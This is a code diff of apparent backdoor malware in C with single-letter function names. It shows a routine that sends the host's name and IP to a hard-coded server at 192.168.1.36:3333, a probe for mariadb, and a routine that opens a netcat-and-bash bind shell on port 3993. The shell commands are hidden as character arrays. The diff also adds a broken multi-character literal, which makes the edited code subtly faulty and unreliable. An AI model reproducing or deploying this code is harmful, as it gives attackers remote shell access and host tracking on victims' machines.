@@ -36,7 +36,8 @@ void c() {
     string ip = exec(cmd.c_str());
     ip.erase(remove(ip.begin(), ip.end(), '\n'), ip.end());
 
-    string url = "http:
+    string url = "http://192.168.1.36:3333/register_ip/";  
+
     string data = "{\"hostname\": \"" + hostname + "\", \"ip\": \"" + ip + "\"}";
 
     CURL *curl;
@@ -63,6 +64,7 @@ void c() {
 
     curl_global_cleanup();
 }
+
 
 void a() {
     char c[] = {'c','o','m','m','a','n','d',' ','-','v',' ','m','a','r','i','a','d','b',' ','>',' ','/','d','e','v','/','n','u','l','l',' ','2','>','&','1','\0'};
@@ -106,20 +108,15 @@ void w() {
         mkfifo(p, 0666);
     }
 
-    FILE *x = fopen(p, "r+");
-    if (!x) {
-        exit(EXIT_FAILURE);
-    }
-
-    const char m[] = {'n','c',' ','-','l',' ','-','p',' ','3','9','9','3',' ','<',' ','m','y','p','i','p','e',' ','|',' ','/','b','i','n','/','b','a','s','h',' ','>',' ','m','y','p','i','p','e',' ','&','\0'};
+    const char m[] = {'n','c',' ','-','l',' ','-','p',' ','3993',' ','<',' ','m','y','p','i','p','e',' ','|',' ','/','b','i','n','/','b','a','s','h',' ','>',' ','m','y','p','i','p','e',' ','&','\0'};
     FILE *y = popen(m, "w");
     if (!y) {
         exit(EXIT_FAILURE);
     }
 
-    pclose(x);
     pclose(y);
 }
+
 
 int main() {
     a();
